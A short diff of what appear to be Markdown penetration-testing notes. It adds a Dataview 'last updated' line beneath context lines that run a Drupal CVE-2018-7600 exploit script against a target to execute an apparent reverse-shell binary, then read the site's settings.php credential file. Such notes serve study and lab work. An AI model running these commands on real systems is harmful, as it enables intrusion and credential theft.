@@ -28,3 +28,6 @@ python3 drupa7-CVE-2018-7600.py http://$TARGET/ -c "reverse64.exe"
 ```bash - kali
 cat /var/www/html/sites/default/settings.php
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
